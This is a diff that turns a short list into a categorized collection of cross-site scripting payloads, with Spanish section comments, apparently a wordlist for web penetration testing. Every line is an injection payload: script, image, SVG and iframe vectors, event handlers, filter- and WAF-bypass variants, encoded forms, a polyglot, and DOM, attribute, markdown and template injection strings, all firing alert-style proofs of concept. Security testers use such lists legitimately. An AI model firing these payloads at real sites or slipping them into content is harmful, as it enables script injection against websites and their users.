@@ -1,4 +1,80 @@
-# Payloads XSS comunes
+# XSS Payloads - Reflected, Stored, DOM
+# Organizados por tipo y técnica de bypass
+
+# === BASIC XSS ===
+<script>alert('XSS')</script>
 <script>alert(1)</script>
-"><img src=x onerror=alert(1)>
-'}},{
+<script>confirm('XSS')</script>
+<script>prompt('XSS')</script>
+
+# === IMG TAG ===
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+<img/src=x onerror=alert('XSS')>
+<img src="x" onerror="alert('XSS')">
+
+# === SVG ===
+<svg onload=alert('XSS')>
+<svg/onload=alert(1)>
+<svg><script>alert('XSS')</script></svg>
+
+# === IFRAME ===
+<iframe src="javascript:alert('XSS')">
+<iframe onload=alert('XSS')>
+
+# === INPUT ===
+<input onfocus=alert('XSS') autofocus>
+<input onblur=alert('XSS') autofocus><input autofocus>
+
+# === BODY ===
+<body onload=alert('XSS')>
+<body onpageshow=alert('XSS')>
+
+# === BYPASS FILTERS ===
+<scr<script>ipt>alert('XSS')</scr</script>ipt>
+<ScRiPt>alert('XSS')</ScRiPt>
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>
+
+# === EVENT HANDLERS ===
+<div onmouseover=alert('XSS')>hover</div>
+<a href="#" onclick=alert('XSS')>click</a>
+<button onclick=alert('XSS')>click</button>
+
+# === JAVASCRIPT PROTOCOL ===
+<a href="javascript:alert('XSS')">click</a>
+<form action="javascript:alert('XSS')"><input type=submit></form>
+
+# === POLYGLOT ===
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
+
+# === DOM XSS ===
+#<img src=x onerror=alert('XSS')>
+?search=<script>alert('XSS')</script>
+&param=<img src=x onerror=alert('XSS')>
+
+# === ATTRIBUTE INJECTION ===
+" onload=alert('XSS') x="
+' onload=alert('XSS') x='
+"autofocus onfocus=alert('XSS') x="
+
+# === ENCODED ===
+%3Cscript%3Ealert('XSS')%3C/script%3E
+&#60;script&#62;alert('XSS')&#60;/script&#62;
+\x3cscript\x3ealert('XSS')\x3c/script\x3e
+\u003cscript\u003ealert('XSS')\u003c/script\u003e
+
+# === MARKDOWN/HTML INJECTION ===
+[click](javascript:alert('XSS'))
+![xss](x onerror=alert('XSS'))
+
+# === TEMPLATE INJECTION ===
+{{alert('XSS')}}
+${alert('XSS')}
+<%= alert('XSS') %>
+
+# === WAF BYPASS ===
+<svg/onload=alert`XSS`>
+<img src=x onerror=alert`1`>
+<script>alert(/XSS/)</script>
+<script>alert(document.domain)</script>
